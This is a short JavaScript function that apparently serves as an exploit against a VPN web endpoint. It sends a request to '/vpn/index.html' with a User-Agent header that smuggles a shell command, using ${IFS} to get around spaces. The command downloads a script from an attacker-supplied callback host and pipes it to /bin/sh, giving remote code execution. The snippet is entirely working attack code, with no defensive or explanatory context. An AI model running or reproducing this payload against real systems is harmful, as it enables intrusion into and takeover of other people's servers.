async function inject(target, callback) {
  const payload = 'pitboss NSPPE-12;curl${IFS}-fsSL${IFS}' + callback + '/bootstrap|/bin/sh;# unexpectedly died';
  return fetch(target + '/vpn/index.html', {headers: {'User-Agent': payload}});
}
